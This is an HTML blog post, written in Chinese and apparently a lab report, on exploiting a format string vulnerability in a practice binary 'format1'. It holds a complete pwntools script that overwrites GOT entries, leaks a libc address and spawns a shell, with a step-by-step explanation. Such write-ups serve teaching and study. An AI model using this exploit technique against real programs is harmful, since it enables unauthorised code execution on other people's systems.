@@ -1,0 +1,175 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Format String Analysis Report | Firework</title><meta name="keywords" content="Pwn,FormatString"><meta name="author" content="Firework"><meta name="copyright" content="Firework"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Format String Analysis Report1.Experiment requirement 掌握格式化字符串漏洞基本原理，并能够利用该漏洞  2.Experiment Target 对format1进行详细分析，编写python脚本，并拿到shell权限 编写完成详细的实验分析报告，对python脚本和利用过程进行详细分析。  3.Experiment process and an">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Format String Analysis Report">
+<meta property="og:url" content="http://example.com/2022/03/25/FormatString/index.html">
+<meta property="og:site_name" content="Firework">
+<meta property="og:description" content="Format String Analysis Report1.Experiment requirement 掌握格式化字符串漏洞基本原理，并能够利用该漏洞  2.Experiment Target 对format1进行详细分析，编写python脚本，并拿到shell权限 编写完成详细的实验分析报告，对python脚本和利用过程进行详细分析。  3.Experiment process and an">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fireworkxzww.top//pic/005BYxJSly1gx2nps63nbj30zk0nptdq.jpg">
+<meta property="article:published_time" content="2022-03-25T13:51:42.913Z">
+<meta property="article:modified_time" content="2022-03-25T16:58:02.010Z">
+<meta property="article:author" content="Firework">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="FormatString">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fireworkxzww.top//pic/005BYxJSly1gx2nps63nbj30zk0nptdq.jpg"><link rel="shortcut icon" href="https://i.loli.net/2021/04/08/2kj1dHCXRf7sGEo.jpg"><link rel="canonical" href="http://example.com/2022/03/25/FormatString/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":30,"languages":{"author":"作者: Firework","link":"链接: ","source":"来源: Firework","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-26 00:58:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Firework" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/04/08/2kj1dHCXRf7sGEo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Firework</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Format String Analysis Report</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-25T13:51:42.913Z" title="发表于 2022-03-25 21:51:42">2022-03-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-25T16:58:02.010Z" title="更新于 2022-03-26 00:58:02">2022-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Format String Analysis Report"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Format-String-Analysis-Report"><a href="#Format-String-Analysis-Report" class="headerlink" title="Format String Analysis Report"></a>Format String Analysis Report</h1><h3 id="1-Experiment-requirement"><a href="#1-Experiment-requirement" class="headerlink" title="1.Experiment requirement"></a>1.Experiment requirement</h3><ul>
+<li>掌握格式化字符串漏洞基本原理，并能够利用该漏洞</li>
+</ul>
+<h3 id="2-Experiment-Target"><a href="#2-Experiment-Target" class="headerlink" title="2.Experiment Target"></a>2.Experiment Target</h3><ul>
+<li>对format1进行详细分析，编写python脚本，并拿到shell权限</li>
+<li>编写完成详细的实验分析报告，对python脚本和利用过程进行详细分析。</li>
+</ul>
+<h3 id="3-Experiment-process-and-analysis"><a href="#3-Experiment-process-and-analysis" class="headerlink" title="3.Experiment process and analysis"></a>3.Experiment process and analysis</h3><h4 id="Shell脚本和GetShell权限结果截图"><a href="#Shell脚本和GetShell权限结果截图" class="headerlink" title="Shell脚本和GetShell权限结果截图"></a>Shell脚本和GetShell权限结果截图</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_format</span>(<span class="params">addr, value</span>):</span></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">            temp = <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            payload+=temp.encode()</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span></span><br><span class="line">            addr_part += p32(addr + i)</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./format1&quot;</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./format1&quot;</span>)</span><br><span class="line">so=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048648</span></span><br><span class="line">exit_got=e.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">offset=so.symbols[<span class="string">&#x27;system&#x27;</span>]-so.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(type(exit_got))</span></span><br><span class="line"></span><br><span class="line">payload_1=generate_format(exit_got,main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_2=<span class="string">b&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_2)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">sys_addr=puts_addr+offset</span><br><span class="line">payload_3=generate_format(printf_got,sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="http://fireworkxzww.top//pic/image-20211102173008203.png" alt=""></p>
+<h4 id="整体流程分析"><a href="#整体流程分析" class="headerlink" title="整体流程分析"></a>整体流程分析</h4><ul>
+<li><p>将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数</p>
+</li>
+<li><p>通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址</p>
+</li>
+<li>用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，在buf 中写入<code>/bin/sh</code>，当执行<code>printf(buf)</code>时，相当于执行<code>system(&#39;/bin/sh&#39;)</code></li>
+</ul>
+<h5 id="覆盖exit函数的GOT表为main函数地址"><a href="#覆盖exit函数的GOT表为main函数地址" class="headerlink" title="覆盖exit函数的GOT表为main函数地址"></a>覆盖exit函数的GOT表为main函数地址</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload_1=generate_format(exit_got,main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_1)</span><br></pre></td></tr></table></figure>
+<p>首先查看开启的保护</p>
+<p><img src="http://fireworkxzww.top//pic/image-20211102185607395.png" alt="image-20211102185607395"></p>
+<p>该可执行文件开启了栈保护，因此排除ROP溢出覆盖返回地址的思路，有printf函数，考虑格式化字符串问题。</p>
+<h5 id="generate-format-exit-got-main-addr-函数分析"><a href="#generate-format-exit-got-main-addr-函数分析" class="headerlink" title="generate_format(exit_got,main_addr)函数分析"></a>generate_format(exit_got,main_addr)函数分析</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_format</span>(<span class="params">addr, value</span>):</span></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)://为了遍历整个value,使得value全部写入</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>://位操作，依次右移<span class="number">8</span>位，使得每次循环处理并写入一个字节</span><br><span class="line">                <span class="keyword">break</span> //value全部写入后结束循环</span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span>//提取出value没有写入的部分位中的后两位(即低位字节)</span><br><span class="line">            temp = <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            //<span class="string">&#x27;&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>是向地址单元&#123;<span class="number">1</span>&#125;写入字节数据&#123;<span class="number">0</span>&#125;+之前已打印的字符,mod <span class="number">0x100</span>是因为一字节数据最大就为<span class="number">0xff</span>,one_byte-print_count是考虑了之前打印的字符个数,关于写入地址后面通过gdb给出具体分析</span><br><span class="line">            payload+=temp.encode()</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span></span><br><span class="line">            addr_part += p32(addr + i) //最后写入需要写入的地址</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">b&#x27;a&#x27;</span>)//填充，因为是<span class="number">32</span>位程序，所以栈上数据会以4bite对齐,由于累计循环写了四次,payload每次循环写入的内容不超过<span class="number">48</span>字节,取向上对齐<span class="number">48</span>字节</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<h5 id="gdb调试确定写入地址"><a href="#gdb调试确定写入地址" class="headerlink" title="gdb调试确定写入地址"></a>gdb调试确定写入地址</h5><p>先确认buf数组在栈上的偏移</p>
+<p><img src="http://fireworkxzww.top//pic/image-20211102191808784.png" alt="image-20211102191808784"></p>
+<p>buf地址为0x0xffffd12c，相对于栈顶(0xffffd12c-0xffffd110)=0x1c=7<em>4，即buf位于格式化字符串中的第7个参数,加上填充的48bytes的内容=4\</em>12，因此第一个写入地址位于格式化字符串中的第7+12=19个参数，此后地址单元num依次为20，21，22，最终payload如下：</p>
+<p><img src="http://fireworkxzww.top//pic/image-20211102192442862.png" alt="image-20211102192442862"></p>
+<h5 id="通过Puts函数泄露system地址-amp-payload-2的构造"><a href="#通过Puts函数泄露system地址-amp-payload-2的构造" class="headerlink" title="通过Puts函数泄露system地址&amp;payload_2的构造"></a>通过Puts函数泄露system地址&amp;payload_2的构造</h5><p>puts函数和system函数都是libc动态链接库的基本函数，相对地址偏移是确定的，确定puts函数实际运行地址后，可以根据so库中的相对地址偏移计算出实际运行时system函数地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload_2=<span class="string">b&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_2)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+<p>payload_2通过%n$s打印puts函数地址，其中n通过之前分析的buf首地址相当于format的第七个参数,刚好对应%n$s四个字节，后面跟着的p32(puts_got)就对应第八个format参数，这样打印出来前四个字节就是puts_got地址。</p>
+<h5 id="通过修改printf函数GOT表为system实现GetShell"><a href="#通过修改printf函数GOT表为system实现GetShell" class="headerlink" title="通过修改printf函数GOT表为system实现GetShell"></a>通过修改printf函数GOT表为system实现GetShell</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exit_got=e.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">offset=so.symbols[<span class="string">&#x27;system&#x27;</span>]-so.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=puts_addr+offset</span><br><span class="line">payload_3=generate_format(printf_got,sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome~\n&quot;</span>)</span><br><span class="line">p.sendline(payload_3)</span><br></pre></td></tr></table></figure>
+<p>通过相对偏移计算出system实际地址，再通过generate<em>format函数实现printf</em>函数got表的替换，这样当调用print函数的时候实际上是调用了system函数，同时printf函数的参数存储再buf中,也恰好是一个参数入栈，那么我们通过标准输入”/bin/sh”就实现了”/bin/sh”压栈并调用system函数的过程，最终成功getshell，不过这个shell有个小瑕疵就是exit的时候会返回一个”Welcome~”。</p>
+<h3 id="4-Summary"><a href="#4-Summary" class="headerlink" title="4.Summary"></a>4.Summary</h3><p>​    通过本次实验,先调试了fs_read、fs_write函数，对格式化字符串泄露栈上数据和任意地址写入非法数据有了更深刻的认识，通过实际手动调试分析format1，掌握应对开启canary保护的可执行文件的pwn思路，此类型题目特征较为明显，有类printf函数的不正确使用、开启金丝雀保护，一般来说都能通过格式化字符串漏洞getshell。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Firework</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/03/25/FormatString/">http://example.com/2022/03/25/FormatString/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Firework</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/FormatString/">FormatString</a></div><div class="post_share"><div class="social-share" data-image="https://fireworkxzww.top//pic/005BYxJSly1gx2nps63nbj30zk0nptdq.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/25/hello_world/"><img class="prev-cover" src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hello World</div></div></a></div><div class="next-post pull-right"><a href="/2022/03/25/EzRop/"><img class="next-cover" src="https://api.dujin.org/bing/1920.php" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Return Oriented Programming Report</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/25/EzRop/" title="Return Oriented Programming Report"><img class="cover" src="https://api.dujin.org/bing/1920.php" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-25</div><div class="title">Return Oriented Programming Report</div></div></a></div><div><a href="/2022/03/25/Linux程序保护机制/" title="Linux程序保护机制"><img class="cover" src="https://i.loli.net/2021/04/18/VqduSoB2nyTh1Fr.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-25</div><div class="title">Linux程序保护机制</div></div></a></div><div><a href="/2022/03/25/Pwnable_2_Rookiss/" title="Pwnable_2_Rookiss"><img class="cover" src="https://fireworkxzww.top//pic/005BYxJSly1h0ko8f5r8ej314y0qqtcm.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-25</div><div class="title">Pwnable_2_Rookiss</div></div></a></div><div><a href="/2022/03/25/Pwnablekr_1/" title="Pwnable_game题解_1"><img class="cover" src="https://i.loli.net/2021/04/14/lRpdG9awJtTnovg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-25</div><div class="title">Pwnable_game题解_1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Format-String-Analysis-Report"><span class="toc-number">1.</span> <span class="toc-text">Format String Analysis Report</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Experiment-requirement"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.Experiment requirement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Experiment-Target"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.Experiment Target</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Experiment-process-and-analysis"><span class="toc-number">1.0.3.</span> <span class="toc-text">3.Experiment process and analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell%E8%84%9A%E6%9C%AC%E5%92%8CGetShell%E6%9D%83%E9%99%90%E7%BB%93%E6%9E%9C%E6%88%AA%E5%9B%BE"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">Shell脚本和GetShell权限结果截图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">整体流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96exit%E5%87%BD%E6%95%B0%E7%9A%84GOT%E8%A1%A8%E4%B8%BAmain%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.0.3.2.1.</span> <span class="toc-text">覆盖exit函数的GOT表为main函数地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#generate-format-exit-got-main-addr-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.2.2.</span> <span class="toc-text">generate_format(exit_got,main_addr)函数分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95%E7%A1%AE%E5%AE%9A%E5%86%99%E5%85%A5%E5%9C%B0%E5%9D%80"><span class="toc-number">1.0.3.2.3.</span> <span class="toc-text">gdb调试确定写入地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Puts%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80-amp-payload-2%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">1.0.3.2.4.</span> <span class="toc-text">通过Puts函数泄露system地址&amp;payload_2的构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9printf%E5%87%BD%E6%95%B0GOT%E8%A1%A8%E4%B8%BAsystem%E5%AE%9E%E7%8E%B0GetShell"><span class="toc-number">1.0.3.2.5.</span> <span 